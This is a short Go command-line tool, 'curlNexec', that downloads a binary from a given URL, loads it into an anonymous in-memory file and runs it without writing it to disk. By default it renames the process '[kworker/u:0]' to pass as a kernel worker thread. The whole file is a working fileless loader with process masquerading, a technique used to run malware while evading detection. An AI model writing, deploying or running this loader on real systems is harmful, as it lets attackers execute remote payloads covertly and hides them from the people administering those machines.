package main

import (
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"os"
	"syscall"

	"github.com/justincormack/go-memfd"
	"github.com/spf13/cobra"
)

func Fexecve(fd uintptr, argv []string, envv []string) (err error) {
	fname := fmt.Sprintf("/proc/%d/fd/%d", os.Getpid(), fd)
	err = syscall.Exec(fname, argv, envv)
	return err
}

func GetBinaryRaw(url string) string {

	resp, err := http.Get(url)

	if err != nil {
		log.Fatal(err)
	}

	defer resp.Body.Close()

	body, err := ioutil.ReadAll(resp.Body)

	if err != nil {
		log.Fatal(err)
	}

	return string(body)
}

func main() {

	//CMD CURLNEXEC
	var name string
	var cmdCurlNexec = &cobra.Command{
		Use:   "curlNexec [remote_url]",
		Short: "Execute remote binary locally",
		Long:  `curl a remote binary file and execute it locally in one single step`,
		Args:  cobra.MinimumNArgs(1),
		Run: func(cmd *cobra.Command, args []string) {

			url := args[0]

			binaryRaw := GetBinaryRaw(url)

			mfd, err := memfd.Create()
			if err != nil {
				panic(err)
			}
			defer mfd.Close()
			_, _ = mfd.WriteString(binaryRaw)
			err = mfd.SetImmutable()
			if err != nil {
				panic(err)
			}

			fd := mfd.Fd()
			argsExec := []string{name, ""}
			environ := os.Environ()

			Fexecve(fd, argsExec, environ)

		},
	}

	//flag handling
	cmdCurlNexec.PersistentFlags().StringVarP(&name, "name", "n", "[kworker/u:0]", "running process name")

	cmdCurlNexec.Execute()
}
